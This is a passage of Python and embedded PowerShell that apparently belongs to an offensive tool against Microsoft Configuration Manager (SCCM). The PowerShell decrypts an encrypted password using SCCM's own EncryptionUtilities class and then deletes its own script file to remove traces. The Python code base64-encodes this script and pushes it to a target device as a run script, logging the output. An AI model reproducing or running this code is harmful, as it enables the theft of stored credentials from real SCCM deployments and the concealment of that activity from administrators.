            $sessionKeyBytes[$i/2] = [Convert]::ToByte($sessionKey.Substring($i, 2), 16)
        }
        
        for($i = 0; $i -lt $encryptedPwd.Length; $i += 2) {
            $encryptedBytes[$i/2] = [Convert]::ToByte($encryptedPwd.Substring($i, 2), 16)
        }
        
        $encUtil = [Microsoft.ConfigurationManager.CommonBase.EncryptionUtilities]::Instance
        $decrypted = $encUtil.DecryptWithGeneratedSessionKey($sessionKeyBytes, $encryptedBytes)
        
        if ($decrypted -ne $null) {
            $length = 0
            foreach($byte in $decrypted) {
                if ($byte -eq 0 -or $byte -lt 32 -or $byte -gt 126) {
                    break
                }
                $length++
            }
            
            $decryptedString = [System.Text.Encoding]::ASCII.GetString($decrypted, 0, $length)
            return $decryptedString
        }
        else {
            Write-Warning "Decryption returned null"
            return $null
        }
    }
    catch {
        Write-Error "Error during decryption: $_"
        return $null
    }
}

function Do-Delete {
    Del $MyInvocation.PSCommandPath
}
Invoke-DecryptEx -sessionKey %r -encryptedPwd %r
Do-Delete
    '''%(session_key, encrypted_blob)
        bom = codecs.BOM_UTF16_LE
        byte_array = bom + script.encode('utf-16-le')
        script_body = base64.b64encode(byte_array).decode('utf-8')
        self.device = device
        self.add_script(script_body)
            

    def printlog(self, result):
        filename = (f'{self.logs_dir}/console.log')
        dt = datetime.now()
        ts = str(dt)
        with open(filename, 'a') as f:
            f.write("--------"+ ts + "--------\n")
            f.write("{}\n".format(result))
            f.close
